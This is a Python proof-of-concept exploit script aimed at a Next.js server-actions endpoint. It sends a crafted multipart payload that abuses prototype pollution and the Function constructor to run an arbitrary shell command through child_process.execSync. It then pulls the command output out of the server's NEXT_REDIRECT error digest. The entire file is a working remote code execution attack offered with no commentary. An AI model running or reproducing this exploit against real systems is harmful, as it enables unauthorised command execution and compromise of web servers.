import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "whoami"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"try {{ var cp = process.mainModule.require('child_process'); var res = cp.execSync('{EXECUTABLE}',{{'timeout':5000,'encoding':'utf8'}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:res}}); }} catch(e) {{ if(e.message === 'NEXT_REDIRECT' && e.digest) {{ throw e; }} var output = ''; if(e.stdout) {{ output = e.stdout.toString().trim(); }} else if(e.stderr) {{ output = e.stderr.toString().trim(); }} else if(e.message) {{ output = e.message; }} else {{ output = String(e); }} throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:output}}); }}",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(f"Status Code: {res.status_code}")

response_text = res.text
if res.encoding:
    try:
        response_text = res.content.decode(res.encoding)
    except:
        try:
            response_text = res.content.decode('utf-8', errors='replace')
        except:
            response_text = res.content.decode('latin-1', errors='replace')

print("\n--- Response ---")
print(response_text)

print("\n--- Command Output ---")
for line in response_text.split('\n'):
    line = line.strip()
    if not line or line.startswith(':'):
        continue
    
    if ':' in line:
        event_type, data = line.split(':', 1)
        if event_type == '1' and data.startswith('E'):
            try:
                error_data = json.loads(data[1:])
                if 'digest' in error_data:
                    digest = error_data.get('digest', '')
                    if digest and not digest.isdigit():
                        print(f"{digest}")
            except json.JSONDecodeError:
                pass
